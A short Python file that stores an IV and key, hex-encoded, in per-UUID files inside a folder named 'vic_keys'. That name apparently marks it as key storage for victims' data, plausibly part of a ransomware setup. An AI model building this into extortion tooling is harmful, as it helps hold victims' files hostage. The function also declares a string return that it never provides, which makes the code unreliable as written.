import uuid
import os

FOLDER_PREFIX = "vic_keys"
if not os.path.isdir(FOLDER_PREFIX):
    os.mkdir(FOLDER_PREFIX)

def save_key(iv:bytes, key:bytes)->str:
    token = str(uuid.uuid4())
    with open(f"{FOLDER_PREFIX}/{token}", "w") as fp:
        fp.writelines([
            iv.hex()+'\n',
            key.hex()
        ])
